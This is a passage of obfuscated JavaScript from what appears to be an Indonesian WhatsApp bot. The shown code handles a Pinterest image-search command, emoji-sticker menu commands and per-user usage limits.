_0x450bdd(_0x331787,_0x39e7d5);},'jsxQK':'applicatio'+_0x11b534(0x4ef,0x471,0x76c,0x7b0)+_0x30f8d6(0x5bc,0x637,0x569,0x849)+'ipt,\x20*/*,\x20'+_0x30f8d6(0xa18,0x757,0xa00,0x63a),'EGZEg':_0x30f8d6(0x30c,0x7f,0x262,-0x31)+_0x30f8d6(0x23f,0x26c,0x6e3,-0x47),'PFfXh':_0x30f8d6(0x344,0x4f5,0x423,0x30b),'iOOwi':_0x30f8d6(0x5d1,0x346,0x6c8,0x6f8),'wkWHA':_0x11b534(0x9fd,0xaaa,0x97a,0x8dd),'yIOTu':_0x30f8d6(-0x171,0x2f,-0x61,0x470),'gohrV':'active','QESfw':'XMLHttpReq'+_0x30f8d6(0x2b8,0x797,0x408,0xa6e),'sNfui':_0x11b534(0x234,0x559,0x71b,0x5ac)+_0x30f8d6(0xf8,0x3f5,0x397,0x2b4)+'t.com/','GVTJz':_0x11b534(0x4ce,0x455,0x9f7,0x8f0),'GkWSV':'GET'};function _0x30f8d6(_0x4a5956,_0x4d0b7b,_0x4002d7,_0x436ba3){return _0x15af3d(_0x4d0b7b- -0x43b,_0x4d0b7b-0x46,_0x4002d7,_0x436ba3-0x4c);}return new Promise((_0x22232a,_0x3f7879)=>{function _0x598f39(_0x16e5e1,_0x53a35c,_0x5d9675,_0x14f290){return _0x30f8d6(_0x16e5e1-0xf9,_0x14f290-0x100,_0x5d9675,_0x14f290-0x136);}function _0x1e190e(_0x11ed54,_0x30d7f8,_0x44f83f,_0x404407){return _0x30f8d6(_0x11ed54-0xb0,_0x30d7f8-0x32,_0x11ed54,_0x404407-0x19c);}const _0x2ab7ac={'eFnic':function(_0x178243,_0x7bf72){return _0x178243===_0x7bf72;},'hyMgC':_0x4478f4[_0x598f39(0x1ea,0x57e,0x29c,0x392)],'rUfUc':'yuqZp','tCWgD':function(_0xe5453d,_0x18785f){return _0x4478f4['wtfCu'](_0xe5453d,_0x18785f);},'syTDV':function(_0x489d70,_0x30c648){return _0x4478f4['ZgvGQ'](_0x489d70,_0x30c648);},'ZuBlW':function(_0x51d2e5,_0x1d8752){return _0x51d2e5(_0x1d8752);}};_0x4478f4[_0x598f39(0x594,0x76b,0x490,0x528)]('vdrLv',_0x4478f4['rgnCv'])?_0x4478f4['ehdLm'](fetch,_0x1e190e(0x435,0x215,0x4ed,0x4c7)+'w.pinteres'+_0x598f39(-0x3f0,0x4dd,-0x4,0xd6)+_0x1e190e(0xb8,0x2a3,-0x1a9,0x451)+_0x1e190e(0x239,0x26,-0x459,-0x20c)+_0x598f39(-0xb7,-0x136,0x512,0x1f1)+_0x598f39(0x186,0x724,0x6fe,0x673)+_0x598f39(0x58f,0x955,0x6b1,0x487)+_0x598f39(0x122,0x56c,0x371,0x242)+_0x598f39(0x67d,0x4ca,0xcb5,0x855)+_0x5e77b9+(_0x598f39(0xe,-0x501,0x3c9,-0x49)+_0x1e190e(-0x5fb,-0x10b,0x6d,0x125)+_0x1e190e(0x512,0x606,0x940,0x79a)+_0x598f39(0x61d,0x7da,-0x104,0x358)+_0x598f39(0x1e0,-0x5d,0x67a,0x3ef)+'se%2C%22qu'+'ery%22%3A%'+'22')+_0x5e77b9+(_0x598f39(-0x1bd,-0x6,-0x5c,0x159)+_0x1e190e(0x6b8,0x415,0x3dd,0xfb)+_0x1e190e(0x69c,0x281,-0xd5,0x22c)+_0x1e190e(-0x93,0x3d4,0x3c5,0x55a)+_0x598f39(0x1f6,-0x212,0x165,0xc5)+_0x1e190e(0x41e,0x3d6,0x805,0x71)+_0x1e190e(0x1ce,0x39c,0x72f,0x15c)+_0x598f39(0xa25,0x92d,0x65c,0x62e)+_0x1e190e(0xc1,0x324,0x151,0x19e)+'t%22%3A%7B'+_0x1e190e(0x75d,0x515,0x583,0x451)+_0x598f39(0x720,0x3a2,0x8aa,0x7b5)+'59'),{'headers':{'accept':_0x4478f4[_0x1e190e(0x4e0,0x110,-0x17c,0x49d)],'accept-language':_0x4478f4['EGZEg'],'cache-control':_0x4478f4['PFfXh'],'pragma':_0x4478f4[_0x598f39(0x442,0x303,0x25f,0x1bf)],'sec-fetch-dest':_0x4478f4[_0x598f39(0x8b9,0x5ea,0x99f,0x6c8)],'sec-fetch-mode':_0x4478f4[_0x1e190e(0x154,0x5d5,0x760,0x2bd)],'sec-fetch-site':_0x1e190e(0x9d8,0x72c,0x975,0x8e4)+'n','sec-gpc':'1','x-app-version':_0x4478f4[_0x1e190e(0x8b3,0x7e3,0x68b,0x870)],'x-pinterest-appstate':_0x4478f4['gohrV'],'x-requested-with':_0x4478f4[_0x1e190e(0x89b,0x4e3,0x842,0x74a)]},'referrer':_0x4478f4[_0x1e190e(0xbd8,0x7a0,0x45d,0x4a1)],'referrerPolicy':_0x4478f4[_0x598f39(0x4fc,0x27d,0x697,0x255)],'body':null,'method':_0x4478f4['GkWSV'],'mode':_0x4478f4[_0x598f39(0x26e,0x564,0xa82,0x6a3)]})['then'](_0x19c16e=>_0x19c16e[_0x598f39(0x4af,0xde,-0x202,0x6)]())[_0x1e190e(0x2a2,0x373,0x96,0x7)](_0x59c9c3=>{function _0x3aeeee(_0x2aad10,_0x24afb1,_0x9eb61b,_0x48eeb3){return _0x1e190e(_0x24afb1,_0x9eb61b-0x63f,_0x9eb61b-0x172,_0x48eeb3-0xd5);}function _0x5e16bd(_0x306995,_0x1e7b9f,_0x1079d7,_0x480787){return _0x1e190e(_0x1e7b9f,_0x1079d7-0x318,_0x1079d7-0xaa,_0x480787-0xce);}if(_0x2ab7ac[_0x5e16bd(0x87,0x441,0x313,0x18b)](_0x2ab7ac['hyMgC'],_0x2ab7ac[_0x5e16bd(0x5a4,0x25f,0x302,0x62f)]))_0x14c56b(_0x1c0f3e[_0x3aeeee(0x491,0x1aa,0x51c,0x7a6)]());else{const _0x1a330e=_0x59c9c3[_0x5e16bd(0x869,0x5ba,0x542,0x410)+'esponse'][_0x5e16bd(0x4d6,0x166,0x24e,-0x28d)][_0x5e16bd(0x7cf,0x876,0xb76,0xe17)][Math[_0x3aeeee(0x11a7,0x866,0xd12,0xb70)](_0x2ab7ac[_0x5e16bd(0xc2e,0xd0b,0xa1d,0x8c3)](Math[_0x5e16bd(0x7dc,0x7a1,0x5a5,0x4a7)](),_0x59c9c3[_0x3aeeee(0x511,0xa23,0x869,0x3cc)+_0x3aeeee(0x9c9,0x559,0x66c,0x8c8)][_0x3aeeee(0x1a8,0x8b1,0x575,0x630)][_0x3aeeee(0xed0,0xadb,0xe9d,0x10a7)]['length']))];var _0x511e6d=[];const _0x2fffec={};_0x2fffec['link']=_0x1a330e['images'][_0x3aeeee(0xa6a,0xc41,0x8aa,0x807)][_0x3aeeee(0xb7d,0x785,0x690,0x52a)],_0x511e6d[_0x5e16bd(0xac2,0x968,0xaf2,0xd19)](_0x2fffec),_0x2ab7ac[_0x5e16bd(0x297,0x1dc,0x446,0x7fa)](_0x22232a,_0x511e6d);}})[_0x598f39(0x3b8,0x14c,0x2b6,0x517)](_0x3f7879):_0x2ab7ac[_0x1e190e(0x7dc,0x5b8,0x420,0x54f)](_0x129c00,_0x56a72d[_0x598f39(0x741,0x5d7,0x470,0x462)][_0x1e190e(0xe3,0x350,0x2ec,-0xcf)]);});}const pinterest=_0x4042c9=>new Promise((_0x4548c2,_0x1425ff)=>{const _0xc2c9e5={'obbls':function(_0x3f0b4f,_0x121eea){return _0x3f0b4f(_0x121eea);},'WVMsr':function(_0x5d1d57,_0x4ec6ce){return _0x5d1d57!==_0x4ec6ce;},'wpthO':_0x46b54b(0x92d,0x635,0x71e,0x653),'CeDno':function(_0x235187,_0x16e7b3){return _0x235187(_0x16e7b3);}};function _0x34176b(_0x105b80,_0x3ea221,_0x358ae8,_0xb658ee){return _0x15af3d(_0x3ea221- -0x17b,_0x3ea221-0x123,_0xb658ee,_0xb658ee-0xd3);}function _0x46b54b(_0x36f544,_0x5d474b,_0x22b30f,_0x33ce22){return _0x15af3d(_0x33ce22-0xa6,_0x5d474b-0x94,_0x36f544,_0x33ce22-0x77);}_0xc2c9e5[_0x46b54b(0xaff,0x552,0xb3b,0xa2d)](pinterestSearch,_0x4042c9)[_0x46b54b(0xbcb,0x9c9,0xcce,0x822)](_0x584167=>{function _0x2096e3(_0x2fd322,_0x26f6f7,_0x1f2ff8,_0xf06396){return _0x46b54b(_0x26f6f7,_0x26f6f7-0x81,_0x1f2ff8-0x1df,_0x1f2ff8-0x15c);}function _0x5d1a3c(_0x35c217,_0x17fa3f,_0x2fc639,_0x6ca77c){return _0x34176b(_0x35c217-0x142,_0x6ca77c- -0x1d9,_0x2fc639-0x79,_0x2fc639);}if(_0xc2c9e5[_0x5d1a3c(0x7bc,0x72f,0x374,0x7d2)](_0xc2c9e5['wpthO'],_0x2096e3(0xa13,0x945,0x7af,0xa7d)))_0xc2c9e5[_0x2096e3(0x333,0x200,0x67e,0xa10)](_0x35c376,_0x965e5f[_0x5d1a3c(-0x12c,-0x1ae,0x11a,-0x6e)]());else{const _0x58485a={};_0x58485a[_0x5d1a3c(-0x4b,0x36f,0x577,0x196)]=0xc8,_0x58485a[_0x5d1a3c(-0x11f,0x2c2,-0x269,0x179)]=_0x584167[0x6e5*0x1+-0xafc+0x417][_0x2096e3(0xd9b,0xc66,0xcc7,0x98b)],_0xc2c9e5[_0x5d1a3c(0x7fb,0x4b4,0x86d,0x633)](_0x4548c2,_0x58485a);}})[_0x46b54b(0x7d3,0x507,0xde1,0x8f8)](_0x1425ff);});pinterest(q)[_0x15af3d(0x77c,0x372,0x904,0x7c5)](async _0x17412a=>{function _0x75ca8b(_0x452eec,_0x3421d7,_0x9c54b3,_0x2a3678){return _0x134458(_0x3421d7- -0x2d1,_0x3421d7-0x121,_0x9c54b3,_0x2a3678-0xc1);}const _0x3e083a={'VxcIH':function(_0x412d04,_0x3bc909){return _0x412d04(_0x3bc909);}};function _0x598652(_0x2cf38a,_0x9ea09,_0x2a1434,_0x5c817b){return _0x134458(_0x2cf38a- -0x230,_0x9ea09-0x6b,_0x9ea09,_0x5c817b-0xc6);}let _0x4d96ba=await _0x3e083a[_0x75ca8b(-0xf7,0x2c,-0x311,-0x64)](getBuffer,_0x17412a[_0x75ca8b(-0xb2,0xa9,0x456,-0x4a)]);alpha['sendMessag'+'e'](from,_0x4d96ba,MessageType[_0x598652(0x14a,0x41a,-0x133,-0x261)],{'caption':_0x598652(0x21f,0x648,0x472,-0x101)+_0x598652(0x42e,0x621,0x80f,0x5ea)+q,'quoted':mek,'thumbnail':Buffer[_0x75ca8b(-0xe1,0x1a9,0x143,-0x135)](0x217e*0x1+0x142+0x8*-0x458)});})['catch'](async _0x2d6470=>{function _0x154cec(_0x4030ad,_0x3da077,_0x3bf825,_0x38f99a){return _0x15af3d(_0x38f99a- -0x24f,_0x3da077-0x29,_0x4030ad,_0x38f99a-0x1d7);}function _0x16589b(_0x164c3c,_0x4961cf,_0x1856df,_0x12646f){return _0x15af3d(_0x164c3c- -0x4c6,_0x4961cf-0x1e3,_0x1856df,_0x12646f-0xe6);}const _0x2cd0d8={'jGXYN':function(_0x256883,_0x2755b6){return _0x256883(_0x2755b6);},'IOjHz':_0x154cec(0x587,0x507,0x5e3,0x8d6)+'salahan'};_0x2cd0d8[_0x154cec(0x665,0x50b,0x1e3,0x2af)](reply,_0x2cd0d8[_0x16589b(0x5d5,0x861,0x2fc,0x77d)]);}),await limitAdd(sender,limit);break;case _0x15af3d(0x534,0x24f,0x49f,0x5a4):case _0x15af3d(0x8e6,0x7c8,0x91a,0x6d5):const _0x1a5d46={};_0x1a5d46[_0x15af3d(0x6ec,0x711,0x398,0x27b)+'t']='Check\x20Limi'+'t';const _0x8d6b8c={};_0x8d6b8c[_0x134458(0xae0,0x82e,0x610,0xc63)]=_0x134458(0x7fd,0xc99,0xb00,0x874),_0x8d6b8c['buttonText']=_0x1a5d46,_0x8d6b8c['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x91b,0xafa,0xae6)](prefix),'©\x20'+ownername,[_0x8d6b8c]);if(!q)return reply('emojinya?');qes=args['join']('\x20');const _0x37ee52={};_0x37ee52[_0x134458(0x502,0x63f,0x11a,0x718)]='Emoji-Appl'+'e-'+qes,_0x37ee52[_0x15af3d(0xbe0,0xb0e,0x92d,0xd9d)+'n']=''+creator,_0x37ee52[_0x134458(0x1e0,0x596,0x3ed,0x1e7)]=''+qes;const _0x1ab25b={};_0x1ab25b[_0x15af3d(0x655,0x16a,0x956,0x35b)]='Emoji-Goog'+_0x134458(0x275,0x51b,-0x212,0x413)+qes,_0x1ab25b[_0x15af3d(0xbe0,0xd90,0xbf8,0xad8)+'n']=''+creator,_0x1ab25b['rowId']=''+qes;const _0x2ed7f5={};_0x2ed7f5[_0x15af3d(0x655,0x8c1,0x265,0x82c)]=_0x15af3d(0x4fb,0x86,0x3ad,0x83)+'ung-'+qes,_0x2ed7f5[_0x134458(0xa8d,0x91c,0x8c3,0xc76)+'n']=''+creator,_0x2ed7f5[_0x134458(0x1e0,-0x22b,0x317,-0x2e2)]=''+qes;const _0x3be5c0={};_0x3be5c0['title']=_0x134458(0x164,0x47b,-0x2d0,0x395)+_0x134458(0xb32,0xd43,0xf5c,0x7e5)+qes,_0x3be5c0[_0x134458(0xa8d,0x7b1,0xa98,0xb89)+'n']=''+creator,_0x3be5c0['rowId']=''+qes;const _0x36da17={};_0x36da17['title']='Emoji-What'+_0x134458(0xb2d,0x908,0xd10,0x667)+qes,_0x36da17[_0x134458(0xa8d,0x7bc,0xa6c,0x698)+'n']=''+creator,_0x36da17['rowId']=''+qes;const _0x2828f6={};_0x2828f6[_0x134458(0x502,0xcf,0x3aa,0x4e5)]=_0x15af3d(0x5e3,0x3d0,0x367,0x467)+_0x15af3d(0x453,0x21d,0x4b5,0x49b)+qes,_0x2828f6[_0x15af3d(0xbe0,0xdb3,0xc59,0xa10)+'n']=''+creator,_0x2828f6[_0x134458(0x1e0,0x3e3,0x4c0,0x4b0)]=''+qes;const _0xd58f31={};_0xd58f31['title']=_0x15af3d(0x784,0x84d,0x919,0xc05)+_0x15af3d(0xb6a,0x8fe,0x976,0xf88)+qes,_0xd58f31[_0x134458(0xa8d,0xcd4,0xad0,0x83e)+'n']=''+creator,_0xd58f31['rowId']=''+qes;const _0x1ade83={};_0x1ade83[_0x134458(0x502,0x7cd,0x179,0xd3)]='Emoji-JoyP'+_0x15af3d(0x48e,0x406,0x25a,0x875)+qes,_0x1ade83['descriptio'+'n']=''+creator,_0x1ade83[_0x15af3d(0x333,0xb9,-0xd0,0x38e)]=''+qes;const _0x3d3965={};_0x3d3965['title']='Emoji-Open'+_0x15af3d(0xae0,0x90f,0x773,0x929)+qes,_0x3d3965[_0x134458(0xa8d,0xa13,0xaba,0xebd)+'n']=''+creator,_0x3d3965['rowId']=''+qes;const _0x81deca={};_0x81deca[_0x134458(0x502,0x732,0x11e,0x3e)]=_0x134458(0x26f,0x553,0x5be,-0x184)+_0x134458(0x163,0x2f0,-0x26b,-0x299)+qes,_0x81deca['descriptio'+'n']=''+creator,_0x81deca[_0x134458(0x1e0,0x402,0x67a,-0x18a)]=''+qes;const _0x4b7510={};_0x4b7510[_0x15af3d(0x655,0x7a0,0x1aa,0x6bc)]=_0x15af3d(0x9a6,0xa34,0x788,0xa02)+_0x15af3d(0xa1e,0x9d2,0x8bb,0xb31)+qes,_0x4b7510[_0x134458(0xa8d,0xc8e,0x628,0xf73)+'n']=''+creator,_0x4b7510['rowId']=''+qes;const _0xfecc8b={};_0xfecc8b['title']=_0x134458(0x34a,0x32d,-0x14c,-0x109)+qes,_0xfecc8b[_0x15af3d(0xbe0,0xe9f,0x109e,0xe02)+'n']=''+creator,_0xfecc8b[_0x134458(0x1e0,0x4a9,0x110,0x46)]=''+qes;const _0x2299c4={};_0x2299c4[_0x15af3d(0x655,0xa18,0xaf1,0x414)]='Emoji-HTC-'+qes,_0x2299c4[_0x15af3d(0xbe0,0xcb8,0xaf6,0x99b)+'n']=''+creator,_0x2299c4[_0x134458(0x1e0,0x519,0x3e3,0x458)]=''+qes;const rows12=[_0x37ee52,_0x1ab25b,_0x2ed7f5,_0x3be5c0,_0x36da17,_0x2828f6,_0xd58f31,_0x1ade83,_0x3d3965,_0x81deca,_0x4b7510,_0xfecc8b,_0x2299c4],_0x151147={};_0x151147[_0x134458(0x502,0x372,0x9df,0x4ae)]=_0x15af3d(0xb0d,0xc77,0xbe0,0x72d)+_0x134458(0xab2,0x720,0xece,0xe64),_0x151147[_0x134458(0xa4e,0x57f,0xb27,0x8ae)]=rows12;const sections12=[_0x151147],listt12={'buttonText':_0x134458(0x426,0x31a,0x74,0x8e)+'E','title':_0x134458(0x684,0x9ee,0xade,0x8ef)+'\x20','description':_0x134458(0xa49,0xa0a,0xdbb,0xb91)+sender['split']('@')[0xb0a+0x9d*-0x7+-0x6bf*0x1]+(_0x15af3d(0x489,0x845,0x8f5,0x838)+_0x15af3d(0x761,0x9a5,0xc17,0xa32)+'nangkan\x20😇,'+_0x134458(0x434,0x717,0x51c,0x84a)+_0x15af3d(0x8fd,0xd98,0x529,0x51c)+_0x15af3d(0x726,0x83e,0x80c,0x297)+'n\x20dipilih!'),'footerText':''+tampilTanggal+enter+tampilWaktu,'sections':sections12,'listType':0x1},_0x23f606={};_0x23f606[_0x134458(0x403,0xd5,0x8d3,0x7a5)+'id']=[sender];const _0x357a00={};_0x357a00[_0x15af3d(0xc2e,0x7d8,0xe88,0x10c9)]=ftoko,_0x357a00[_0x134458(0x968,0xa5f,0x47e,0x7d4)+'o']=_0x23f606,alpha[_0x134458(0x982,0x730,0x723,0x610)+'e'](from,listt12,MessageType[_0x134458(0x5ba,0x643,0x112,0x737)+'e'],_0x357a00),await limitAdd(sender,limit);break;}if(sub_yt_zeeone_ofc==_0x134458(0x2dd,0x1d6,0x359,0x71a)+'e-'+q5){const _0x6b5c5c={};_0x6b5c5c['displayTex'+'t']=_0x15af3d(0x959,0x783,0x569,0xd02)+'t';const _0x976314={};_0x976314[_0x15af3d(0xc33,0xc37,0xfad,0xf7b)]='limit',_0x976314[_0x134458(0x454,0x39d,0x812,0x87)]=_0x6b5c5c,_0x976314[_0x134458(0x8ff,0x6fc,0x463,0x6cd)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x5da,0xdb7,0x5ba)](prefix),'©\x20'+ownername,[_0x976314]);reply(lang[_0x15af3d(0x3cc,0x708,0x77a,-0x4d)]()),emoji[_0x134458(0x94a,0x884,0x6c9,0x662)](''+q5)[_0x134458(0x629,0x71b,0x401,0xa6e)](async _0x5c1d2e=>{const _0xb4e2e1={'QTSru':function(_0x5177a8,_0x48215b,_0x178586){return _0x5177a8(_0x48215b,_0x178586);}};teks=''+_0x5c1d2e[_0x422019(0x657,0x902,0x803,0x886)][-0x13e9+0x14a*0x5+0x47d*0x3][_0x57309a(0x476,0x5c0,0x8b4,0x86d)];function _0x57309a(_0x56743c,_0x3d0a71,_0x334264,_0x5eb5f6){return _0x134458(_0x56743c-0x16f,_0x3d0a71-0x1d5,_0x334264,_0x5eb5f6-0x1b1);}function _0x422019(_0x26b6f4,_0x55bcdc,_0x1e27f,_0x217beb){return _0x134458(_0x55bcdc-0x375,_0x55bcdc-0x4,_0x217beb,_0x217beb-0x165);}console[_0x422019(0xa7c,0xdbc,0x104b,0xe7f)](teks),sendStickerFromUrl(from,''+teks),await _0xb4e2e1[_0x422019(0xca7,0x7c3,0xa6a,0x377)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc=='Emoji-Goog'+_0x15af3d(0x3c8,0x54f,0x510,0x221)+q5){const _0x192ec2={};_0x192ec2[_0x15af3d(0x6ec,0xa67,0xb0c,0x4b7)+'t']=_0x15af3d(0x959,0x48f,0xdc6,0x818)+'t';const _0x3699aa={};_0x3699aa['buttonId']=_0x134458(0x7fd,0xc39,0xce4,0xc32),_0x3699aa[_0x134458(0x454,-0x2f,0x660,0x31)]=_0x192ec2,_0x3699aa[_0x15af3d(0xa52,0x6ee,0xd37,0xc55)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x4a1,0x896,0x659)](prefix),'©\x20'+ownername,[_0x3699aa]);emoji[_0x134458(0x94a,0xa51,0xba7,0x9ec)](''+q5)[_0x15af3d(0x77c,0x428,0x67b,0xb56)](async _0xf26fe7=>{const _0x3b38cb={'vQRwv':function(_0x57b5a0,_0x2cbade,_0x395f65){return _0x57b5a0(_0x2cbade,_0x395f65);}};teks=''+_0xf26fe7[_0x2f147d(0x21e,0x6e1,0x66e,0x3a7)][0x1541+0x8*-0x2a2+-0x30][_0x576536(0x526,-0x15a,-0x1d7,0xac)],console[_0x576536(0xc13,0xca7,0x4a6,0x7ec)](teks),_0x3b38cb['vQRwv'](sendStickerFromUrl,from,''+teks);function _0x576536(_0x2395a4,_0x5f4edb,_0x23cef8,_0x365727){return _0x134458(_0x365727- -0x25b,_0x5f4edb-0xad,_0x5f4edb,_0x365727-0x119);}function _0x2f147d(_0x4105a3,_0x2fcd5d,_0x2b801d,_0x13ae4d){return _0x15af3d(_0x2fcd5d-0x1,_0x2fcd5d-0x150,_0x4105a3,_0x13ae4d-0xa6);}await limitAdd(sender,limit);});}if(sub_yt_zeeone_ofc==_0x134458(0x3a8,0x614,0x2a4,0x14e)+'ung-'+q5){const _0x48005c={};_0x48005c[_0x15af3d(0x6ec,0xa19,0x670,0x71c)+'t']='Check\x20Limi'+'t';const _0x53828a={};_0x53828a[_0x15af3d(0xc33,0x863,0x1024,0xabf)]=_0x15af3d(0x950,0x81c,0x518,0x552),_0x53828a[_0x134458(0x454,0xb1,0xb6,-0x91)]=_0x48005c,_0x53828a['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x76a,0x71c,0x664)](prefix),'©\x20'+ownername,[_0x53828a]);reply(lang[_0x15af3d(0x3cc,0x35e,-0xf4,0x11d)]()),emoji['get'](''+q5)[_0x15af3d(0x77c,0x941,0x38a,0x587)](async _0x10691e=>{function _0x3f17b0(_0x49a18b,_0x4e2447,_0x52b423,_0xd936a9){return _0x134458(_0x4e2447-0x33f,_0x4e2447-0x1e3,_0xd936a9,_0xd936a9-0x67);}const _0x1a1e22={'KHYCq':function(_0x2b46ca,_0x100e1c,_0x928b2b){return _0x2b46ca(_0x100e1c,_0x928b2b);}};function _0x13dad7(_0x50af15,_0x54daec,_0x5450e1,_0xebc014){return _0x15af3d(_0x50af15- -0x296,_0x54daec-0x1dc,_0xebc014,_0xebc014-0x4f);}teks=''+_0x10691e[_0x13dad7(0x44a,0x4e2,0xb1,0x8f7)][-0x1*0x7d3+0x1*-0x156d+0x1d42]['url'],console[_0x13dad7(0x904,0x75e,0xde0,0x8b5)](teks),_0x1a1e22[_0x13dad7(0x758,0xa9b,0x338,0x8c3)](sendStickerFromUrl,from,''+teks),await _0x1a1e22[_0x3f17b0(0x7de,0xbda,0xf8e,0x104d)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc=='Emoji-Micr'+_0x134458(0xb32,0x695,0xaee,0xd1e)+q5){const _0x11ad34={};_0x11ad34[_0x134458(0x599,0x24c,0x51e,0x851)+'t']=_0x134458(0x806,0x876,0xacd,0x6d3)+'t';const _0x96abf5={};_0x96abf5[_0x134458(0xae0,0xbbe,0x8ab,0x7a3)]=_0x134458(0x7fd,0xaad,0x33d,0x3ce),_0x96abf5['buttonText']=_0x11ad34,_0x96abf5['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xc23,0x5d7,0xbad)](prefix),'©\x20'+ownername,[_0x96abf5]);emoji[_0x134458(0x94a,0xab5,0x999,0xe35)](''+q5)['then'](async _0x4ad548=>{function _0x3531bc(_0x92b426,_0x1ed2ce,_0x25d0bf,_0x118f88){return _0x134458(_0x1ed2ce- -0x2d7,_0x1ed2ce-0x1e1,_0x118f88,_0x118f88-0xeb);}const _0xbf6eae={'uGZYL':function(_0x1f49af,_0x44e50e,_0x1a9d67){return _0x1f49af(_0x44e50e,_0x1a9d67);},'iRYAd':function(_0x4f6a8e,_0x4593bc,_0x1a5aa8){return _0x4f6a8e(_0x4593bc,_0x1a5aa8);}};teks=''+_0x4ad548[_0x3531bc(-0x102,0x2b6,-0xd9,0x31a)][0x5*0x583+-0x2205+0x679][_0x3531bc(0x3df,0x30,0x40f,0x40d)],console[_0x368dff(0x8cc,0xabe,0x969,0x683)](teks);function _0x368dff(_0x175355,_0x3bcd8f,_0x4f60f8,_0x50d50d){return _0x15af3d(_0x3bcd8f- -0xdc,_0x3bcd8f-0x15c,_0x175355,_0x50d50d-0x122);}_0xbf6eae[_0x3531bc(0x1e5,0x4b7,0x5ef,0xd0)](sendStickerFromUrl,from,''+teks),await _0xbf6eae['iRYAd'](limitAdd,sender,limit);});}function _0x4ca6(_0x3bf7e6,_0x135dcc){const _0x16f959=_0x5499();return _0x4ca6=function(_0x5e4aef,_0x4ba1a3){_0x5e4aef=_0x5e4aef-(0x125*0x22+0x1ce8+-0x426e);let _0x52566c=_0x16f959[_0x5e4aef];if(_0x4ca6['UmyUoR']===undefined){var _0x39fd3b=function(_0x3a27c2){const _0x2fe7ce='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2e23f8='',_0x4775ae='';for(let _0x3c9708=-0x1d93+-0x3b*-0x9e+-0x6d7,_0x4f81d2,_0x280baa,_0x2488c5=-0x1f12*0x1+-0x1304*-0x2+-0x6f6;_0x280baa=_0x3a27c2['charAt'](_0x2488c5++);~_0x280baa&&(_0x4f81d2=_0x3c9708%(-0x1cd1*-0x1+0x1933+-0x9*0x600)?_0x4f81d2*(0xfa3+-0x1ef6+0xf93)+_0x280baa:_0x280baa,_0x3c9708++%(0x98*0xe+0x9e*-0x29+0x1102))?_0x2e23f8+=String['fromCharCode'](-0x1f5+-0x1502+0x17f6&_0x4f81d2>>(-(-0x552+0x2386+-0x1e32)*_0x3c9708&-0x206a+0x1*0x177a+0x8f6)):0x257a+-0x17*-0x48+-0x2bf2){_0x280baa=_0x2fe7ce['indexOf'](_0x280baa);}for(let _0x44bd79=0x1497+-0x2588+0x10f1,_0x1c53fc=_0x2e23f8['length'];_0x44bd79<_0x1c53fc;_0x44bd79++){_0x4775ae+='%'+('00'+_0x2e23f8['charCodeAt'](_0x44bd79)['toString'](0x205*0x6+0x48*0x23+0x2*-0xaf3))['slice'](-(-0x1*-0x772+0x1894+-0x2004));}return decodeURIComponent(_0x4775ae);};_0x4ca6['KvgyZU']=_0x39fd3b,_0x3bf7e6=arguments,_0x4ca6['UmyUoR']=!![];}const _0x53f6fd=_0x16f959[0x250b+0xf40+-0x344b],_0x386d14=_0x5e4aef+_0x53f6fd,_0x3a8421=_0x3bf7e6[_0x386d14];return!_0x3a8421?(_0x52566c=_0x4ca6['KvgyZU'](_0x52566c),_0x3bf7e6[_0x386d14]=_0x52566c):_0x52566c=_0x3a8421,_0x52566c;},_0x4ca6(_0x3bf7e6,_0x135dcc);}if(sub_yt_zeeone_ofc==_0x15af3d(0xb62,0xe85,0x681,0xd42)+'sApp-'+q5){const _0x10fa36={};_0x10fa36[_0x134458(0x599,0x8e0,0x6a9,0x3f2)+'t']=_0x15af3d(0x959,0xb51,0x66b,0x607)+'t';const _0x1601f5={};_0x1601f5[_0x134458(0xae0,0x6c5,0xa98,0xf44)]=_0x15af3d(0x950,0x7e5,0xe1c,0xa50),_0x1601f5[_0x15af3d(0x5a7,0xd9,0x756,0xde)]=_0x10fa36,_0x1601f5['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xdd7,0xc73,0xc53)](prefix),'©\x20'+ownername,[_0x1601f5]);reply(lang[_0x15af3d(0x3cc,0x8,0xbf,0x162)]()),emoji['get'](''+q5)[_0x134458(0x629,0x2a2,0x256,0x83a)](async _0x585e1d=>{const _0x251e4f={'MvvaW':function(_0x40b98d,_0x5bcc0b,_0x5a69fb){return _0x40b98d(_0x5bcc0b,_0x5a69fb);}};function _0x38ca1d(_0x366622,_0x5e789e,_0x56be55,_0x46cc80){return _0x15af3d(_0x366622- -0x16d,_0x5e789e-0x52,_0x56be55,_0x46cc80-0xb5);}teks=''+_0x585e1d[_0x366dd9(0x4d0,0x1e,0x296,-0x214)][0x1127*-0x1+0x521*0x5+-0x2*0x43d]['url'],console[_0x38ca1d(0xa2d,0xa6d,0x8d6,0x7ff)](teks),sendStickerFromUrl(from,''+teks);function _0x366dd9(_0x11e05f,_0x113864,_0x5dd4f1,_0x26dcda){return _0x134458(_0x5dd4f1- -0x2f7,_0x113864-0x1f3,_0x11e05f,_0x26dcda-0x14b);}await _0x251e4f[_0x38ca1d(0xb10,0xfd2,0x85e,0xb94)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc==_0x134458(0x490,0x975,0x8c1,0x2ca)+_0x134458(0x300,0x344,0x763,-0x79)+q5){const _0x5b91ad={};_0x5b91ad[_0x15af3d(0x6ec,0xad3,0xae8,0x6c2)+'t']='Check\x20Limi'+'t';const 